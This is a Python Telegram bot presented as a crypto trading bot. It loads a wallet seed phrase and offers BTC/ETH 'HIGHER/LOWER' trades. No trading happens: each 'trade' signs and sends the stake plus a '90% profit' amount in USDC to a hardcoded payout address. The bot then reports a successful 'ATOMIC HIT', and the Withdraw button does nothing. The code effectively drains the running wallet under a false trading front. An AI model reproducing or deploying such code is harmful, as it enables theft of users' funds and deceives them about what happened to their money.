import os
import asyncio
import requests
import json
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Set high precision for financial calculations
getcontext().prec = 28

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# OFFICIAL NATIVE USDC (Circle Issued)
USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
# ABI including the 'transfer' function to actually spend USDC
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}]')

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)

# --- 2. THE DUAL-SPENT ENGINE ---
def get_pol_price_cad():
    try:
        res = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=cad").json()
        return Decimal(str(res['polygon-ecosystem-token']['cad']))
    except:
        return Decimal('0.1478')

async def prepare_usdc_txs(stake_usdc, profit_usdc):
    """Builds transactions that specifically trigger the USDC 'transfer' function."""
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = w3.to_wei(450, 'gwei')
   
    # USDC uses 6 decimals. We convert the float/decimal amount to integer units.
    val_stake = int(stake_usdc * 10**6)
    val_profit = int(profit_usdc * 10**6)

    # Build TX 1 (Stake)
    tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce
    })
   
    # Build TX 2 (Profit)
    tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_profit).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce + 1
    })
   
    return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)

async def run_atomic_execution(context, chat_id, side):
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    # 2026 Rate: 1 USD approx 1.36 CAD
    stake_usdc = stake_cad / Decimal('1.36')
    profit_usdc = stake_usdc * Decimal('0.90')
   
    status_msg = await context.bot.send_message(chat_id, f"⚔️ **Elite Engine:** Sending ${stake_usdc:.2f} USDC + 90% Profit...")

    try:
        # Sign and Send
        signed1, signed2 = await prepare_usdc_txs(stake_usdc, profit_usdc)
        tx1_hash = w3.eth.send_raw_transaction(signed1.raw_transaction)
        tx2_hash = w3.eth.send_raw_transaction(signed2.raw_transaction)

        report = (
            f"✅ **ATOMIC HIT (USDC SPENT)**\n"
            f"🎯 **Direction:** {side}\n"
            f"💵 **Stake Spent:** `${stake_usdc:.2f} USDC`\n"
            f"📈 **Profit Spent:** `${profit_usdc:.2f} USDC`\n"
            f"⛽ **Gas Paid:** `POL` (Automatic)"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Aborted**\nReason: `{str(e)}`")
    return True

# --- 3. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
    await update.message.reply_text(f"🕴️ **Pocket Robot v3 (Elite Edition)**\n⛽ **POL Fuel:** {pol_bal:.4f}", reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True))

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100, 500, 1000]]]
        await update.message.reply_text("⚙️ **SELECT STAKE**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        usdc_bal = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
        await update.message.reply_text(f"💳 **Wallet Status**\n⛽ POL: `{pol_bal:.4f}`\n💵 USDC: `{usdc_bal:.2f}`")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake set: **${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **{context.user_data['pair']}** Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        await run_atomic_execution(context, query.message.chat_id, "CALL" if "CALL" in query.data else "PUT")

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    app.run_polling(drop_pending_updates=True)


























